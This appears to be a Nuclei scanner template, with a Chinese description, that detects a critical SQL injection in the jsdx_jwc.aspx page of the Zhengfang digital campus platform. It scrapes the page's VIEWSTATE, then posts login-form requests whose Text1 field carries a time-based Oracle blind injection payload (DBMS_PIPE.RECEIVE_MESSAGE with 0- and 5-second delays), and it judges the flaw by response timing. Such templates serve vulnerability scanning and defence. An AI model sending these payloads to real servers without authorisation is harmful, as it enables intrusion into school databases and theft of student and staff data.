id: zfca-jsdx_jwc-sqli

info:
  name: zfca-jsdx_jwc-sqli
  author: HB
  severity: critical
  description: 正方数字化校园平台jsdx_jwc存在SQL注入漏洞

http:
  - raw:
    - |
      GET /jsdx_jwc.aspx?url=js_jxrw.aspx&usertype=1 HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0
      Accept-Encoding: gzip, deflate
      Accept: */*
      Connection: close
    - |
      POST /jsdx_jwc.aspx?url=js_jxrw.aspx&usertype=1 HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0
      Accept-Encoding: gzip, deflate
      Accept: */*
      Connection: close
      Content-Type: application/x-www-form-urlencoded
      Cookie: ASP.NET_SessionId=y40w2d454fi1155532uqfx45
      Content-Length: 132

      __VIEWSTATE={{VIEWSTATE}}&__VIEWSTATEGENERATOR=&Text1=123%27+AND+1655%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28107%29%7C%7CCHR%28103%29%7C%7CCHR%2877%29%7C%7CCHR%2890%29%2C0%29+AND+%27nBHe%27%3D%27nBHe&Text2=admin&Button1=%E7%99%BB %E5%BD%95

    - |
      POST /jsdx_jwc.aspx?url=js_jxrw.aspx&usertype=1 HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0
      Accept-Encoding: gzip, deflate
      Accept: */*
      Connection: close
      Content-Type: application/x-www-form-urlencoded
      Cookie: ASP.NET_SessionId=y40w2d454fi1155532uqfx45
      Content-Length: 132

      __VIEWSTATE={{VIEWSTATE}}&__VIEWSTATEGENERATOR=&Text1=123%27+AND+1655%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28107%29%7C%7CCHR%28103%29%7C%7CCHR%2877%29%7C%7CCHR%2890%29%2C5%29+AND+%27nBHe%27%3D%27nBHe&Text2=admin&Button1=%E7%99%BB %E5%BD%95

    extractors:
      - type: regex
        name: VIEWSTATE
        group: 1
        regex: 
         - '\"__VIEWSTATE\" value=\"(.+?)\"'
        internal: true
    
    matchers:
      - type: dsl
        condition: and
        dsl:
          - 'duration_2>=0 && duration_2<=1'
          - 'duration_3>=5 && duration_3<=6'